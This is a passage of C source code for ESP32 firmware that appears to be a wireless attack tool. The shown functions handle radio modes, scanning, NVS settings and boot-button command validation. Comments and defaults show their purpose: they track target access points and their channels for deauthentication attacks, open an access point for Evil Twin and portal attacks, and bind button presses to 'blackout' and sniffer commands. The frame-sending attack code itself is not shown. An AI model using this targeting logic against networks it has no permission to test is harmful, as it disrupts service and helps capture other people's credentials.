        MY_LOG_INFO(TAG, "OTA: running state=%d, no mark needed", (int)state);
    }
}

static void ota_log_boot_info(void) {
    const esp_partition_t *boot = esp_ota_get_boot_partition();
    const esp_partition_t *running = esp_ota_get_running_partition();
    const esp_partition_t *next = esp_ota_get_next_update_partition(NULL);
    const esp_partition_t *invalid = esp_ota_get_last_invalid_partition();
    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;

    if (running) {
        esp_err_t err = esp_ota_get_state_partition(running, &state);
        if (err != ESP_OK) {
            state = ESP_OTA_IMG_UNDEFINED;
        }
    }

    MY_LOG_INFO(TAG, "OTA: boot partition=%s offset=0x%lx",
                boot ? boot->label : "n/a",
                boot ? (unsigned long)boot->address : 0UL);
    MY_LOG_INFO(TAG, "OTA: running partition=%s offset=0x%lx state=%d",
                running ? running->label : "n/a",
                running ? (unsigned long)running->address : 0UL,
                (int)state);
    MY_LOG_INFO(TAG, "OTA: next update partition=%s offset=0x%lx",
                next ? next->label : "n/a",
                next ? (unsigned long)next->address : 0UL);
    if (invalid) {
        MY_LOG_INFO(TAG, "OTA: last invalid partition=%s offset=0x%lx",
                    invalid->label,
                    (unsigned long)invalid->address);
        MY_LOG_INFO(TAG, "OTA: rollback detected (booted from %s)",
                    running ? running->label : "n/a");
    }
}

// --- Wi-Fi initialization (STA only - uses less memory) ---
// AP mode will be enabled dynamically when needed (Evil Twin, Portal)
static esp_err_t wifi_init_ap_sta(void) {
    // Initialize netif only once (shared between WiFi and BLE modes)
    if (!netif_initialized) {
        ESP_ERROR_CHECK(esp_netif_init());
        netif_initialized = true;
    }
    
    // Create event loop only once (shared between WiFi and BLE modes)
    if (!event_loop_initialized) {
        ESP_ERROR_CHECK(esp_event_loop_create_default());
        event_loop_initialized = true;
    }

    // Only create STA interface once (reused on WiFi re-init)
    if (sta_netif_handle == NULL) {
        sta_netif_handle = esp_netif_create_default_wifi_sta();
    }

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Register event handler only once (survives WiFi reinit after mode switch)
    if (!wifi_event_handler_registered) {
        ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                            ESP_EVENT_ANY_ID,
                                                            &wifi_event_handler,
                                                            NULL,
                                                            NULL));
        wifi_event_handler_registered = true;
    }
    if (!ip_event_handler_registered) {
        ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                            IP_EVENT_STA_GOT_IP,
                                                            &ip_event_handler,
                                                            NULL,
                                                            NULL));
        ip_event_handler_registered = true;
    }

    wifi_config_t wifi_config = { 0 };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t mac[6];
    esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);

    if (ret == ESP_OK) {
         MY_LOG_INFO("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        ESP_LOGE("MAC", "Failed to get MAC address");
    }

    return ESP_OK;
}

static esp_err_t wifi_apply_extended_country(void)
{
    wifi_country_t wifi_country = {
        .cc = "PH",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_AUTO,
    };

    esp_err_t err = esp_wifi_set_country(&wifi_country);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set WiFi country for channels 1-13: %s", esp_err_to_name(err));
    }
    return err;
}

static void wifi_get_24ghz_channel_bounds(uint8_t *first_channel, uint8_t *last_channel)
{
    uint8_t first = 1;
    uint8_t last = 11;
    wifi_country_t wifi_country = { 0 };

    if (esp_wifi_get_country(&wifi_country) == ESP_OK && wifi_country.nchan > 0) {
        int country_first = wifi_country.schan;
        int country_last = wifi_country.schan + wifi_country.nchan - 1;

        if (country_first < 1) {
            country_first = 1;
        }
        if (country_last > 13) {
            country_last = 13;
        }
        if (country_first <= country_last) {
            first = (uint8_t)country_first;
            last = (uint8_t)country_last;
        }
    }

    if (first_channel != NULL) {
        *first_channel = first;
    }
    if (last_channel != NULL) {
        *last_channel = last;
    }
}

// ============================================================================
// Radio Mode Switching (lazy initialization)
// ============================================================================

/**
 * Ensure WiFi mode is active. If BLE is active, reboots to switch.
 * Returns true if WiFi is ready to use, false if switching (will reboot).
 */
static bool ensure_wifi_mode(void)
{
    switch (current_radio_mode) {
        case RADIO_MODE_WIFI:
            // Already in WiFi mode
            return true;
            
        case RADIO_MODE_NONE:
            // Initialize WiFi
            MY_LOG_INFO(TAG, "Initializing WiFi...");
            esp_err_t ret = wifi_init_ap_sta();
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "WiFi init failed: %d", ret);
                return false;
            }
            
            wifi_apply_extended_country();
            
            current_radio_mode = RADIO_MODE_WIFI;
            wifi_initialized = true;
            MY_LOG_INFO(TAG, "WiFi initialized OK");
            return true;
            
        case RADIO_MODE_BLE:
            // Deinitialize BLE and switch to WiFi
            MY_LOG_INFO(TAG, "Switching from BLE to WiFi mode...");
            bt_nimble_deinit();
            current_radio_mode = RADIO_MODE_NONE;
            // Now initialize WiFi (recursive call with RADIO_MODE_NONE)
            return ensure_wifi_mode();
    }
    return false;
}

/**
 * Ensure BLE mode is active. If WiFi is active, deinits WiFi first.
 * Returns true if BLE is ready to use, false if switching (will reboot).
 */
static bool ensure_ble_mode(void)
{
    switch (current_radio_mode) {
        case RADIO_MODE_BLE:
            // Already in BLE mode
            return true;
            
        case RADIO_MODE_NONE:
            // Initialize BLE
            MY_LOG_INFO(TAG, "Initializing BLE (NimBLE)...");
            esp_err_t ret = bt_nimble_init();
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "BLE init failed: %d", ret);
                return false;
            }
            current_radio_mode = RADIO_MODE_BLE;
            MY_LOG_INFO(TAG, "BLE initialized OK");
            return true;
            
        case RADIO_MODE_WIFI: {
            // Deinitialize WiFi and switch to BLE
            MY_LOG_INFO(TAG, "Switching from WiFi to BLE mode...");
            esp_wifi_stop();
            esp_wifi_deinit();
            // Only destroy AP netif, keep STA netif for reuse on WiFi re-init
            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
            if (ap_netif) {
                esp_netif_destroy(ap_netif);
            }
            // Note: sta_netif_handle is preserved for WiFi re-initialization
            wifi_initialized = false;
            current_radio_mode = RADIO_MODE_NONE;
            // Now initialize BLE (recursive call with RADIO_MODE_NONE)
            return ensure_ble_mode();
        }
    }
    return false;
}

// Track if AP netif was created
static esp_netif_t *ap_netif_handle = NULL;

/**
 * Enable AP mode (switch to APSTA if needed) for Evil Twin, Portal, etc.
 * Must be called after ensure_wifi_mode().
 * Returns the AP netif handle, or NULL on failure.
 */
static esp_netif_t *ensure_ap_mode(void)
{
    if (current_radio_mode != RADIO_MODE_WIFI) {
        MY_LOG_INFO(TAG, "WiFi must be initialized first");
        return NULL;
    }
    
    // Check if AP netif already exists
    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) {
        wifi_mode_t mode = WIFI_MODE_NULL;
        if (esp_wifi_get_mode(&mode) == ESP_OK) {
            if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
                return ap_netif;
            }
        }
        // AP netif exists but mode is not AP/APSTA, re-enable AP mode.
        MY_LOG_INFO(TAG, "Re-enabling AP mode...");
        esp_wifi_stop();
        esp_err_t ret = esp_wifi_set_mode(WIFI_MODE_APSTA);
        if (ret != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(ret));
            esp_wifi_start();
            return NULL;
        }
        ret = esp_wifi_start();
        if (ret != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to restart WiFi: %s", esp_err_to_name(ret));
            return NULL;
        }
        return ap_netif;
    }
    
    // Need to stop WiFi, switch mode, and restart
    MY_LOG_INFO(TAG, "Enabling AP mode...");
    
    esp_wifi_stop();
    
    // Create AP netif
    ap_netif_handle = esp_netif_create_default_wifi_ap();
    if (!ap_netif_handle) {
        MY_LOG_INFO(TAG, "Failed to create AP netif");
        esp_wifi_start();
        return NULL;
    }
    
    // Switch to APSTA mode
    esp_err_t ret = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(ret));
        esp_wifi_start();
        return NULL;
    }
    
    // Configure minimal AP to start
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,
            .password = "nevermind",
            .max_connection = 0,
            .authmode = WIFI_AUTH_WPA2_PSK
        },
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to restart WiFi: %s", esp_err_to_name(ret));
        return NULL;
    }
    
    MY_LOG_INFO(TAG, "AP mode enabled");
    return ap_netif_handle;
}

// ============================================================================

// --- Start background scan ---
static esp_err_t start_background_scan(uint32_t min_time, uint32_t max_time) {
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start background scan: wardrive is active. Use 'stop' first.");
        return ESP_ERR_INVALID_STATE;
    }

    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan already in progress");
        return ESP_ERR_INVALID_STATE;
    }
    
    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = min_time,
        .scan_time.active.max = max_time,
    };
    
    g_scan_in_progress = true;
    g_scan_done = false;
    g_scan_count = 0;
    
    MY_LOG_INFO(TAG, "Starting background WiFi scan...");
    esp_err_t ret = esp_wifi_scan_start(&scan_cfg, false); // nieblokujace
    
    if (ret != ESP_OK) {
        g_scan_in_progress = false;
        MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(ret));
        return ret;
    }
    
    return ESP_OK;
}

// Save target BSSIDs for channel monitoring
static void save_target_bssids(void) {
    target_bssid_count = 0;
    
    for (int i = 0; i < g_selected_count && target_bssid_count < MAX_TARGET_BSSIDS; ++i) {
        int idx = g_selected_indices[i];
        wifi_ap_record_t *ap = &g_scan_results[idx];
        
        target_bssids[target_bssid_count].channel = ap->primary;
        target_bssids[target_bssid_count].last_seen = esp_timer_get_time() / 1000;
        target_bssids[target_bssid_count].active = true;
        
        // Copy BSSID
        memcpy(target_bssids[target_bssid_count].bssid, ap->bssid, 6);
        
        // Copy SSID
        strncpy(target_bssids[target_bssid_count].ssid, (const char*)ap->ssid, 32);
        target_bssids[target_bssid_count].ssid[32] = '\0';
        
        target_bssid_count++;
    }
    
    // Debug: Print saved target BSSIDs
    for (int i = 0; i < target_bssid_count; ++i) {
        MY_LOG_INFO(TAG, "Target BSSID[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
                   i, target_bssids[i].ssid,
                   target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                   target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5],
                   target_bssids[i].channel);
    }
}

// Static buffer for quick scan to avoid stack overflow (smaller buffer for channel monitoring)
#define QUICK_SCAN_MAX_APS 32
static wifi_ap_record_t quick_scan_results[QUICK_SCAN_MAX_APS];

// Quick channel scan for target BSSIDs
static esp_err_t quick_channel_scan(void) {
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Starting quick channel scan for target BSSIDs...");
    }
    
    // Use the main scanning function instead of quick scan
    esp_err_t err = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
    if (err != ESP_OK) {
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Quick scan failed: %s", esp_err_to_name(err));
        }
        return err;
    }
    
    // Wait for scan to complete (dynamic timeout based on channel times)
    int timeout = 0;
    int timeout_limit = get_scan_timeout_iterations();
    while (g_scan_in_progress && timeout < timeout_limit) {
        vTaskDelay(pdMS_TO_TICKS(100));
        timeout++;
    }
    
    if (g_scan_in_progress) {
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Scan taking longer than expected, waiting for completion...");
        }
        // Wait additional time for scan to complete naturally (up to 30 seconds)
        int extra_wait = 0;
        while (g_scan_in_progress && extra_wait < 300) {
            vTaskDelay(pdMS_TO_TICKS(100));
            extra_wait++;
        }
        // If still in progress after extra wait, then stop
        if (g_scan_in_progress) {
            if (!periodic_rescan_in_progress) {
                MY_LOG_INFO(TAG, "Scan still in progress, forcing stop...");
            }
            esp_wifi_scan_stop();
            g_scan_in_progress = false;
            return ESP_ERR_TIMEOUT;
        }
    }
    
    if (!g_scan_done || g_scan_count == 0) {
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "No scan results available");
        }
        return ESP_ERR_NOT_FOUND;
    }
    
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Successfully retrieved %d scan records", g_scan_count);
    }
    
    // Copy scan results to our buffer
    uint16_t copy_count = (g_scan_count < QUICK_SCAN_MAX_APS) ? g_scan_count : QUICK_SCAN_MAX_APS;
    memcpy(quick_scan_results, g_scan_results, copy_count * sizeof(wifi_ap_record_t));
    
    // Update target channels based on scan results
    update_target_channels(quick_scan_results, copy_count);
    
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Quick channel scan completed");
    }
    return ESP_OK;
}

// Update target channels based on latest scan results
static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count) {
    bool channel_changed = false;
    
    if (!periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
        
        // Log current g_selected_indices and their corresponding BSSIDs
        MY_LOG_INFO(TAG, "Current g_selected_indices and BSSIDs:");
        for (int i = 0; i < g_selected_count; ++i) {
            int idx = g_selected_indices[i];
            MY_LOG_INFO(TAG, "  g_selected_indices[%d] = %d -> BSSID: %02X:%02X:%02X:%02X:%02X:%02X, SSID: %s", 
                       i, idx, g_scan_results[idx].bssid[0], g_scan_results[idx].bssid[1], g_scan_results[idx].bssid[2],
                       g_scan_results[idx].bssid[3], g_scan_results[idx].bssid[4], g_scan_results[idx].bssid[5],
                       g_scan_results[idx].ssid);
        }
        
        // Debug: Print all scan results
        for (int i = 0; i < scan_count; ++i) {
            MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
                       i, scan_results[i].ssid,
                       scan_results[i].bssid[0], scan_results[i].bssid[1], scan_results[i].bssid[2],
                       scan_results[i].bssid[3], scan_results[i].bssid[4], scan_results[i].bssid[5],
                       scan_results[i].primary);
        }
    }
    
    for (int i = 0; i < target_bssid_count; ++i) {
        if (!target_bssids[i].active) continue;
        
        if (!periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Checking target BSSID %s (current channel: %d)", 
                       target_bssids[i].ssid, target_bssids[i].channel);
        }
        
        // Find matching BSSID in scan results
        bool found = false;
        for (int j = 0; j < scan_count; ++j) {
            if (memcmp(target_bssids[i].bssid, scan_results[j].bssid, 6) == 0) {
                uint8_t old_channel = target_bssids[i].channel;
                target_bssids[i].channel = scan_results[j].primary;
                target_bssids[i].last_seen = esp_timer_get_time() / 1000;
                found = true;
                
                if (!periodic_rescan_in_progress) {
                    MY_LOG_INFO(TAG, "FOUND: Target BSSID %s (%02X:%02X:%02X:%02X:%02X:%02X) found in scan results at index %d, channel: %d", 
                               target_bssids[i].ssid, target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                               target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], j, scan_results[j].primary);
                }
                
                if (old_channel != target_bssids[i].channel) {
                    // ALWAYS log channel changes, even during periodic re-scan
                    MY_LOG_INFO(TAG, "Channel change detected for %s: %d -> %d", 
                               target_bssids[i].ssid, old_channel, target_bssids[i].channel);
                    channel_changed = true;
                }
                break;
            }
        }
        
        if (!found && !periodic_rescan_in_progress) {
            MY_LOG_INFO(TAG, "Target BSSID %s not found in scan results", target_bssids[i].ssid);
        }
    }
    
    if (channel_changed && !periodic_rescan_in_progress) {
        MY_LOG_INFO(TAG, "Channel changes detected, will resume deauth on new channels");
        MY_LOG_INFO(TAG, "Note: Using target_bssids[] directly for deauth attack to avoid index confusion");
    }
}

// Check if it's time for channel check
static bool check_channel_changes(void) {
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
    
    if (current_time - last_channel_check_time >= CHANNEL_CHECK_INTERVAL_MS) {
        last_channel_check_time = current_time;
        return true;
    }
    
    return false;
}

static void escape_csv_field(const char* input, char* output, size_t output_size) {
    if (!input || !output || output_size < 2) return;
    
    size_t input_len = strlen(input);
    size_t out_pos = 0;
    
    for (size_t i = 0; i < input_len && out_pos < output_size - 2; i++) {
        if (input[i] == '"') {
            if (out_pos < output_size - 3) {
                output[out_pos++] = '"';
                output[out_pos++] = '"';
            }
        } else {
            output[out_pos++] = input[i];
        }
    }
    output[out_pos] = '\0';
}

const char* authmode_to_string(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2 Mixed";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2 Enterprise";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/WPA3 Mixed";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI";
        default:
            return "Unknown";
    }
}

static void vendor_persist_state(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(VENDOR_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Vendor NVS open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t value = vendor_lookup_enabled ? 1 : 0;
    err = nvs_set_u8(handle, VENDOR_NVS_KEY_ENABLED, value);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Vendor NVS write failed: %s", esp_err_to_name(err));
    }
    nvs_close(handle);
}

static void vendor_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(VENDOR_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Vendor NVS read open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t value = vendor_lookup_enabled ? 1 : 0;
    err = nvs_get_u8(handle, VENDOR_NVS_KEY_ENABLED, &value);
    if (err == ESP_OK) {
        vendor_lookup_enabled = value != 0;
    } else if (err != ESP_ERR_NVS_NOT_FOUND) {
        ESP_LOGW(TAG, "Vendor NVS get failed: %s", esp_err_to_name(err));
    }
    nvs_close(handle);
}

static bool vendor_is_enabled(void) {
    return vendor_lookup_enabled;
}

static esp_err_t vendor_set_enabled(bool enabled) {
    vendor_lookup_enabled = enabled;
    vendor_last_valid = false;
    vendor_last_hit = false;
    vendor_lookup_buffer[0] = '\0';
    vendor_file_checked = false;
    vendor_file_present = false;
    vendor_record_count = 0;
    vendor_persist_state();
    return ESP_OK;
}

static const char *display_mode_to_str(display_type_t mode)
{
    switch (mode) {
    case DISPLAY_SSD1306: return "ssd1306";
    case DISPLAY_SH1107:  return "sh1107";
    case DISPLAY_SH1106:  return "sh1106";
    case DISPLAY_UNIT_LCD:return "unit_lcd";
    case DISPLAY_NONE:
    default:
        return "auto";
    }
}

static bool display_mode_from_str(const char *s, display_type_t *out_mode)
{
    if (!s || !out_mode) return false;
    if (strcasecmp(s, "auto") == 0) {
        *out_mode = DISPLAY_NONE;
        return true;
    }
    if (strcasecmp(s, "ssd1306") == 0) {
        *out_mode = DISPLAY_SSD1306;
        return true;
    }
    if (strcasecmp(s, "sh1107") == 0) {
        *out_mode = DISPLAY_SH1107;
        return true;
    }
    if (strcasecmp(s, "sh1106") == 0) {
        *out_mode = DISPLAY_SH1106;
        return true;
    }
    if (strcasecmp(s, "unit_lcd") == 0 || strcasecmp(s, "lcd") == 0) {
        *out_mode = DISPLAY_UNIT_LCD;
        return true;
    }
    return false;
}

static void display_mode_save_to_nvs(display_type_t mode)
{
    nvs_handle_t handle;
    esp_err_t err = nvs_open(DISPLAY_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Display NVS open failed: %s", esp_err_to_name(err));
        return;
    }
    err = nvs_set_u8(handle, DISPLAY_NVS_KEY_MODE, (uint8_t)mode);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Display NVS write failed: %s", esp_err_to_name(err));
    }
    nvs_close(handle);
}

static void display_mode_load_from_nvs(void)
{
    nvs_handle_t handle;
    esp_err_t err = nvs_open(DISPLAY_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        display_forced_mode = DISPLAY_NONE;
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Display NVS read open failed: %s", esp_err_to_name(err));
        display_forced_mode = DISPLAY_NONE;
        return;
    }

    uint8_t raw = (uint8_t)DISPLAY_NONE;
    err = nvs_get_u8(handle, DISPLAY_NVS_KEY_MODE, &raw);
    nvs_close(handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        display_forced_mode = DISPLAY_NONE;
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Display NVS get failed: %s", esp_err_to_name(err));
        display_forced_mode = DISPLAY_NONE;
        return;
    }

    switch ((display_type_t)raw) {
    case DISPLAY_NONE:
    case DISPLAY_SSD1306:
    case DISPLAY_SH1107:
    case DISPLAY_SH1106:
    case DISPLAY_UNIT_LCD:
        display_forced_mode = (display_type_t)raw;
        break;
    default:
        display_forced_mode = DISPLAY_NONE;
        break;
    }
}

static bool boot_is_command_allowed(const char* command) {
    if (command == NULL || command[0] == '\0') {
        return false;
    }
    for (size_t i = 0; i < boot_allowed_command_count; i++) {
        if (strcasecmp(command, boot_allowed_commands[i]) == 0) {
            return true;
        }
    }
    return false;
}

typedef bool (*boot_flow_visitor_t)(char *command_line, void *ctx);

static char* boot_trim_whitespace(char *text) {
    if (text == NULL) {
        return NULL;
    }

    while (*text && isspace((unsigned char)*text)) {
        text++;
    }

    char *end = text + strlen(text);
    while (end > text && isspace((unsigned char)end[-1])) {
        *--end = '\0';
    }

    return text;
}

static bool boot_buffer_append_char(char *dest, size_t dest_size, size_t *pos, char ch) {
    if (dest == NULL || pos == NULL || *pos + 1 >= dest_size) {
        return false;
    }

    dest[*pos] = ch;
    (*pos)++;
    dest[*pos] = '\0';
    return true;
}

static bool boot_buffer_append_text(char *dest, size_t dest_size, size_t *pos, const char *text) {
    if (dest == NULL || pos == NULL || text == NULL) {
        return false;
    }

    size_t len = strlen(text);
    if (*pos + len >= dest_size) {
        return false;
    }

    memcpy(dest + *pos, text, len);
    *pos += len;
    dest[*pos] = '\0';
    return true;
}

static bool boot_append_serialized_arg(char *dest, size_t dest_size, size_t *pos, const char *arg) {
    if (arg == NULL) {
        arg = "";
    }

    bool needs_quotes = (arg[0] == '\0');
    for (const char *p = arg; *p != '\0'; ++p) {
        if (isspace((unsigned char)*p) || *p == '"' || *p == '\\') {
            needs_quotes = true;
            break;
        }
    }

    if (!needs_quotes) {
        return boot_buffer_append_text(dest, dest_size, pos, arg);
    }

    if (!boot_buffer_append_char(dest, dest_size, pos, '"')) {
        return false;
    }

    for (const char *p = arg; *p != '\0'; ++p) {
        if (*p == '"' || *p == '\\') {
            if (!boot_buffer_append_char(dest, dest_size, pos, '\\')) {
                return false;
            }
        }
        if (!boot_buffer_append_char(dest, dest_size, pos, *p)) {
            return false;
        }
    }

    return boot_buffer_append_char(dest, dest_size, pos, '"');
}

static bool boot_build_command_flow_from_argv(int argc, char **argv, int start_index, char *dest, size_t dest_size) {
    if (dest == NULL || dest_size == 0 || argc <= start_index || argv == NULL) {
        return false;
    }

    dest[0] = '\0';

    if ((argc - start_index) == 1) {
        return strlcpy(dest, argv[start_index], dest_size) < dest_size;
    }

    size_t pos = 0;
    for (int i = start_index; i < argc; ++i) {
        if (argv[i] == NULL) {
            continue;
        }
        if (pos > 0 && !boot_buffer_append_char(dest, dest_size, &pos, ' ')) {
            return false;
        }
        if (!boot_append_serialized_arg(dest, dest_size, &pos, argv[i])) {
            return false;
        }
    }

    return pos > 0;
}

static bool boot_visit_command_flow(char *flow, boot_flow_visitor_t visitor, void *ctx) {
    if (flow == NULL || visitor == NULL) {
        return false;
    }

    char *segment_start = flow;
    bool in_single_quote = false;
    bool in_double_quote = false;
    bool escape_next = false;
    bool saw_command = false;

    for (char *cursor = flow; ; ++cursor) {
        char ch = *cursor;

        if (escape_next) {
            escape_next = false;
        } else if (ch == '\\' && in_double_quote) {
            escape_next = true;
        } else if (ch == '"' && !in_single_quote) {
            in_double_quote = !in_double_quote;
        } else if (ch == '\'' && !in_double_quote) {
            in_single_quote = !in_single_quote;
        }

        bool at_end = (ch == '\0');
        bool at_separator = (ch == ',' && !in_single_quote && !in_double_quote);

        if (at_end && (in_single_quote || in_double_quote || escape_next)) {
            return false;
        }

        if (!at_separator && !at_end) {
            continue;
        }

        *cursor = '\0';
        char *segment = boot_trim_whitespace(segment_start);
        if (segment == NULL || segment[0] == '\0') {
            return false;
        }

        saw_command = true;
        if (!visitor(segment, ctx)) {
            return false;
        }

        if (at_end) {
            break;
        }

        segment_start = cursor + 1;
    }

    return saw_command;
}

typedef struct {
    char invalid_command[BOOTCFG_CMD_MAX_LEN];
} boot_flow_validation_ctx_t;

static bool boot_validate_command_segment(char *command_line, void *ctx) {
    boot_flow_validation_ctx_t *validation = (boot_flow_validation_ctx_t *)ctx;
    char *argv_local[16];
    size_t argc = esp_console_split_argv(command_line, argv_local, sizeof(argv_local) / sizeof(argv_local[0]));
    if (argc == 0) {
        return false;
    }

    if (!boot_is_command_allowed(argv_local[0])) {
        if (validation != NULL) {
            strlcpy(validation->invalid_command, argv_local[0], sizeof(validation->invalid_command));
        }
        return false;
    }

    return true;
}

static boot_flow_validation_result_t boot_validate_command_flow(const char *flow,
                                                               char *detail,
                                                               size_t detail_size) {
    if (detail != NULL && detail_size > 0) {
        detail[0] = '\0';
    }

    if (flow == NULL || flow[0] == '\0') {
        return BOOT_FLOW_MALFORMED;
    }

    char flow_copy[BOOTCFG_CMD_MAX_LEN];
    if (strlcpy(flow_copy, flow, sizeof(flow_copy)) >= sizeof(flow_copy)) {
        return BOOT_FLOW_MALFORMED;
    }

    boot_flow_validation_ctx_t validation = {0};
    if (!boot_visit_command_flow(flow_copy, boot_validate_command_segment, &validation)) {
        if (detail != NULL && detail_size > 0 && validation.invalid_command[0] != '\0') {
            strlcpy(detail, validation.invalid_command, detail_size);
            return BOOT_FLOW_INVALID_COMMAND;
        }
        return BOOT_FLOW_MALFORMED;
    }

    return BOOT_FLOW_VALID;
}

static void boot_config_set_defaults(void) {
    memset(&boot_config, 0, sizeof(boot_config));
    boot_config.short_press.enabled = false;
    strlcpy(boot_config.short_press.command, "start_sniffer_dog", sizeof(boot_config.short_press.command));
    boot_config.long_press.enabled = false;
    strlcpy(boot_config.long_press.command, "start_blackout", sizeof(boot_config.long_press.command));
}

static void boot_config_persist(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(BOOTCFG_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Boot cfg save open failed: %s", esp_err_to_name(err));
        return;
    }

    esp_err_t write_err = nvs_set_u8(handle, BOOTCFG_KEY_SHORT_EN, boot_config.short_press.enabled ? 1U : 0U);
    if (write_err == ESP_OK) {
        write_err = nvs_set_u8(handle, BOOTCFG_KEY_LONG_EN, boot_config.long_press.enabled ? 1U : 0U);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_set_str(handle, BOOTCFG_KEY_SHORT_CMD, boot_config.short_press.command);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_set_str(handle, BOOTCFG_KEY_LONG_CMD, boot_config.long_press.command);
    }
    if (write_err == ESP_OK) {
        write_err = nvs_commit(handle);
    }

    nvs_close(handle);

    if (write_err != ESP_OK) {
        ESP_LOGW(TAG, "Boot cfg save failed: %s", esp_err_to_name(write_err));
    }
}

static void boot_config_load_from_nvs(void) {
    boot_config_set_defaults();

    nvs_handle_t handle;
    esp_err_t err = nvs_open(BOOTCFG_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Boot cfg load open failed: %s", esp_err_to_name(err));
        return;
    }

    uint8_t value = 0;
    err = nvs_get_u8(handle, BOOTCFG_KEY_SHORT_EN, &value);
    if (err == ESP_OK) {
        boot_config.short_press.enabled = value != 0;
    }

    value = 0;
    err = nvs_get_u8(handle, BOOTCFG_KEY_LONG_EN, &value);
    if (err == ESP_OK) {
        boot_config.long_press.enabled = value != 0;
